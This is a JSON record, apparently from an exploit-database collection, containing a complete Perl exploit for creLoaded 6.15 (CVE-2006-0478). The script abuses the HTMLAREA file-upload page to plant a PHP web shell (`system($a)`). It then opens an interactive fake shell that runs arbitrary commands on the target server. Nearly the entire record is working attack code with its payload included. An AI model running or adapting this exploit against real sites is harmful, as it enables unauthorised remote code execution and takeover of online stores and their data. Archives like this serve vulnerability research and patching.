{
  "id": "1446",
  "title": "creLoaded 6.15 - &#039;HTMLAREA&#039; Automated Perl",
  "cve": "CVE-2006-0478",
  "vuln_type": "file_upload",
  "code": "#!/usr/bin/perl\r\n#\r\n# creLoaded <= 6.15 HTMLAREA automated perl exploit\r\n# hacked up by kaneda <kaneda@blacksecurity.org>\r\n#\r\n# Rather simple exploit, but still an exploit nonetheless.  Attempts to upload php script and \r\n# utilise that to execute commands, and show off a fake shell.\r\n#\r\n# Can specify:\r\n# \t* User-defined PHP script or one provided in this script (suits most occasions)\r\n# \t* Additional variables to pass to PHP script after upload\r\n# \t* HTTP proxy\r\n#\r\n# Read the (messy) code before use.\r\n#\r\n# Greets: nemo, mercy, riotact, zeroday, modem, phildo, gimmemylanta, rodjek, negz\r\n#\r\n\r\nprint \"creLoaded <= 6.15 HTMLAREA automated perl exploit\\nhacked up by kaneda\\n\";\r\n\r\nuse LWP::UserAgent;\r\nuse HTTP::Request::Common;\r\nuse Getopt::Std;\r\nuse Term::ReadLine;\r\n\r\nmy $baseurl = \"/admin/htmlarea/popups/file/files.php\";\r\n\r\nmy $status = getopts('s:p:a:');\r\nif(@ARGV < 1) { die(usage()); }\r\n\r\nmy %vars, $response, $masterurl, $browser, $cmd;\r\n$masterurl = @ARGV[0];\r\n$browser = LWP::UserAgent->new;\r\n\r\nif($opt_s) {\r\n\tprint \"[*] User-defined script '$opt_s' will be used instead of 'default'\\n\";\r\n}\r\n\r\nif($opt_p) {\r\n\t$browser->proxy(['http', 'https'] => $opt_p);\r\n\tprint \"[*] HTTP/HTTPS proxy set to $opt_p\\n\";\r\n}\r\n\r\nif($opt_a) {\r\n\t@tmp = split(\",\",$opt_a);\r\n\tforeach $tmpvar (@tmp) {\r\n\t\t@tmp2 = split(\"=\",$tmpvar);\r\n\t\t$vars{$tmp2[0]} = $tmp2[1];\r\n\t\tprint \"[+] Adding variable '\" . $tmp2[0] . \"' with value '\" . $tmp2[1] . \"'\\n\";\r\n\t}\r\n}\r\n\r\nsub usage \r\n{\r\n\tprint \"usage: creloaded615.pl [-s/path/to/file.php] [-phostname:port] [-avarname1=value1,...,varname2=value2] URL\\n\\n\";\r\n\tprint \"-a - additional variables i.e. -aaction=create,cid=12\\n\";\r\n\tprint \"-p - use http/https proxy, format hostname:port i.e. -pmyproxy.com:8080\\n\";\r\n\tprint \"-s - specify path to user-defined script instead of using default\\n\";\r\n\tprint \"URL - http://vuln/store\\n\\n\";\r\n\texit;\r\n}\r\n\r\nsub sendform \r\n{\r\n\tif($opt_G) {\r\n\t\tmy $url = $masterurl . \"?\";\r\n\t\t# Non-issue, but could beautify the single line here at a later date.\r\n\t\tforeach $tmp (keys (%vars)) {\r\n\t\t\t$url .= \"\\&$tmp=\" . $vars{$tmp};\r\n\t\t}\r\n\t\t$response = $browser->get($url);\r\n\t\tdie \"Failed to get!\" unless defined $response;\r\n\t} else {\r\n\t\t$response = $browser->post($masterurl, \\%vars);\r\n\t\tdie \"Failed to post!\" unless defined $response;\r\n\t}\r\n}\r\n\r\nif(!$opt_s) {\r\n\t# Lazy.\r\n\tprint \"[*] Creating 'default' PHP script\\n\";\r\n\t$tmp = \"<?php system(\\$a); ?>\";\r\n\topen(FILE, \"> /tmp/default.php\");\r\n\tprint FILE $tmp;\r\n\tclose(FILE);\r\n\t$opt_s = \"/tmp/default.php\";\r\n}\r\n\r\nopen(FILE, \"< $opt_s\");\r\n@content = <FILE>;\r\nclose(FILE);\r\n\r\nif(!$vars{\"dirPath\"}) {\r\n\tprint \"[*] Setting upload path to $masterurl/images\\n\";\r\n\t$vars{\"dirPath\"} = \"/../images/\";\r\n}\r\n$tmp = $masterurl . $baseurl;\r\nprint \"[*] Abusing creLOADED\\n\";\r\n$browser->timeout(10);\r\n$req = POST $tmp, Content_Type => 'form-data', Content => [ actions => \"upload\", dirPath => $vars{\"dirPath\"}, upload => [ $opt_s ] ];\r\n$response = $browser->request($req);\r\n$browser->timeout(180);\r\n$term = Term::ReadLine->new('cre');\r\n\r\nprint \"[*] Executing 'id' then spawning fake shell\\n\";\r\n$masterurl = $masterurl . \"/images/default.php\";\r\n$vars{\"a\"} = \"id\";\r\n&sendform;\r\nprint $response->content;\r\nwhile(1) {\r\n\t$prompt = \"bash-2.05b\\$ \";\r\n\t$tmp = $term->readline($prompt, \"\");\r\n\t$cmd = $tmp;\r\n\t\r\n\tif(($cmd eq \"quit\") || ($cmd eq \"exit\")) {\r\n\t\texit;\r\n\t}\r\n\r\n\t$vars{\"a\"} = $cmd;\r\n\t&sendform;\r\n\tprint $response->content;\r\n}\r\n\r\n# milw0rm.com [2006-01-24]",
  "url": "https://www.exploit-db.com/exploits/1446"
}